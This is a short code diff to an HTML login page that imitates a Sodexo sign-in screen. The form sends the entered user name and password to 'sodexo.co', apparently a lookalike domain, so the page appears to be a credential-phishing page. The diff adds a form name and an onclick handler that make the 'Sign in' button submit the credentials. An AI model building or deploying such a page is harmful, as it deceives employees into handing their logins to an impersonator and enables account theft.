@@ -31,7 +31,7 @@
     <div id="loginArea">        
         <div id="loginMessage" class="groupMargin">Enter your Sodexo user name and password</div>
 
-        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" action="https://www.sodexo.co">
+        <form method="post" name="login" id="loginForm" autocomplete="off" novalidate="novalidate" action="https://www.sodexo.co">
             <div id="formsAuthenticationArea">
                 <div id="userNameArea">
                     <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
@@ -42,7 +42,7 @@
                     <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
                 </div>
                 <div id="submissionArea" class="submitMargin">
-                    <span id="submitButton" class="submit" tabindex="4" role="button">Sign in</span>
+                    <span id="submitButton" class="submit" tabindex="4" role="button" onclick="document.forms['login'].submit();">Sign in</span>
                 </div>
             </div>
         <div id="introduction" class="groupMargin">
